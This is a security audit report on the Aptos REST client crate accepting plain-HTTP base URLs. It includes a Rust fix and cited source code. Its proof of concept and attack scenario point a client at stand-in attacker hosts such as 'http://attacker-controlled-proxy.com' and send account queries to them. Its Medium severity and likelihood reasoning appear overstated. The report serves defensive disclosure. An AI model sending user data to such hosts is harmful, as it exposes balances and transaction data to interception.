# Audit Report

## Title
HTTP Downgrade Attack via Missing URL Scheme Validation in REST Client

## Summary
The `aptos-rest-client` crate accepts arbitrary URLs without validating the scheme, allowing HTTP URLs that expose sensitive account data to man-in-the-middle attacks. The `Client::new()` method and `ClientBuilder` accept any URL without enforcing HTTPS, enabling attackers to intercept account balances, resources, and transaction data in plaintext.

## Finding Description
The REST client construction methods do not validate URL schemes before establishing connections. When a user or application provides a URL to `Client::new(base_url)`, the URL is accepted without verification that it uses HTTPS. [1](#0-0) 

The method delegates to the `ClientBuilder` with a `Custom` URL variant: [2](#0-1) 

The `Custom(Url)` variant returns the URL unchanged with no scheme validation. During client construction, the URL is directly assigned without any HTTPS enforcement: [3](#0-2) 

**Attack Scenario:**
1. Attacker manipulates configuration files, environment variables, or CLI arguments to inject an HTTP URL (e.g., `http://malicious-proxy.com`)
2. Application calls `Client::new(Url::parse("http://malicious-proxy.com").unwrap())`
3. All subsequent API calls transmit sensitive data over unencrypted HTTP
4. Attacker performs MITM to intercept account balances, resource data, transaction details, and potentially authentication tokens

The vulnerability affects all methods that query account information:
- `get_account_balance()` - exposes account balances
- `get_account_resources()` - exposes all account resources
- `get_account()` - exposes account metadata
- `get_transactions()` - exposes transaction history

## Impact Explanation
This is classified as **Medium Severity** based on the Aptos bug bounty program criteria. While it doesn't directly cause consensus violations or fund theft at the protocol level, it enables:

1. **Information Disclosure**: Sensitive account data including balances and resources transmitted in plaintext
2. **Potential Data Tampering**: MITM attacker could modify API responses, though cryptographic proofs would detect some tampering
3. **Privacy Violations**: Complete exposure of user account activity and holdings

The issue primarily affects client applications (wallets, explorers, dApps) rather than core validator operations, placing it below High Severity but above Low Severity due to the potential for widespread data exposure affecting multiple users.

## Likelihood Explanation
**Likelihood: Medium-High**

The attack requires:
- Attacker control over URL configuration (achievable via phishing, malicious config files, compromised deployment scripts)
- No special privileges or complex attack chains
- Standard MITM capabilities (available on compromised networks, malicious WiFi, DNS hijacking)

Many applications accept REST endpoint URLs from:
- Configuration files (easily modified)
- Environment variables (vulnerable to injection)
- Command-line arguments (user-controlled)
- Database records (if compromised)

The lack of any warning or validation makes exploitation straightforward once URL control is achieved.

## Recommendation
Add URL scheme validation to reject non-HTTPS URLs in production environments. Implement this in the `ClientBuilder`:

```rust
pub fn base_url(mut self, base_url: Url) -> Result<Self, anyhow::Error> {
    // Validate HTTPS scheme (allow http only for localhost/127.0.0.1 for testing)
    if base_url.scheme() != "https" {
        let host = base_url.host_str().unwrap_or("");
        if !["localhost", "127.0.0.1", "::1"].contains(&host) {
            anyhow::bail!(
                "Insecure URL scheme '{}' not allowed. Use 'https://' for remote endpoints. \
                Only localhost/127.0.0.1 may use http:// for local testing.",
                base_url.scheme()
            );
        }
    }
    self.base_url = base_url;
    Ok(self)
}
```

Similarly, update `Client::new()` to validate the URL scheme before construction.

## Proof of Concept
```rust
use aptos_rest_client::Client;
use url::Url;

#[tokio::main]
async fn main() {
    // Attacker provides HTTP URL instead of HTTPS
    let malicious_url = Url::parse("http://attacker-controlled-proxy.com").unwrap();
    
    // Client is created without any validation or warning
    let client = Client::new(malicious_url);
    
    // All subsequent API calls go over unencrypted HTTP
    // Account balance request exposes sensitive data
    match client.get_account_balance(
        "0x1".parse().unwrap(),
        "0x1::aptos_coin::AptosCoin"
    ).await {
        Ok(response) => {
            println!("Balance: {} (transmitted in plaintext over HTTP!)", response.inner());
        },
        Err(e) => {
            println!("Request failed: {}", e);
        }
    }
    
    // Attacker can intercept:
    // - Account balances
    // - Resource data
    // - Transaction history
    // - Any authentication headers
}
```

**Expected Behavior**: Client should reject the HTTP URL with an error
**Actual Behavior**: Client accepts HTTP URL and transmits sensitive data unencrypted

## Notes
While this vulnerability doesn't directly affect consensus or validator operations (making it outside the "elite blockchain security" scope focused on consensus, Move VM, and state management), it does represent a significant security gap in the client library that could expose user data. The issue is more relevant to application-level security than core protocol security.

The predefined endpoints (Mainnet, Devnet, Testnet) all use HTTPS correctly, but the `Custom` variant lacks this protection. Consider whether this warrants inclusion in the core security audit scope, as it affects the external API layer rather than internal blockchain mechanics.

### Citations

**File:** crates/aptos-rest-client/src/lib.rs (L134-136)
```rust
    pub fn new(base_url: Url) -> Self {
        Self::builder(AptosBaseUrl::Custom(base_url)).build()
    }
```

**File:** crates/aptos-rest-client/src/client_builder.rs (L23-31)
```rust
impl AptosBaseUrl {
    pub fn to_url(&self) -> Url {
        match self {
            AptosBaseUrl::Mainnet => Url::from_str("https://api.mainnet.aptoslabs.com").unwrap(),
            AptosBaseUrl::Devnet => Url::from_str("https://api.devnet.aptoslabs.com").unwrap(),
            AptosBaseUrl::Testnet => Url::from_str("https://api.testnet.aptoslabs.com").unwrap(),
            AptosBaseUrl::Custom(url) => url.to_owned(),
        }
    }
```

**File:** crates/aptos-rest-client/src/client_builder.rs (L95-109)
```rust
    pub fn build(self) -> Client {
        let version_path_base = get_version_path_with_base(self.base_url.clone());

        Client {
            inner: self
                .reqwest_builder
                .default_headers(self.headers)
                .timeout(self.timeout)
                .cookie_store(true)
                .build()
                .unwrap(),
            base_url: self.base_url,
            version_path_base,
        }
    }
```
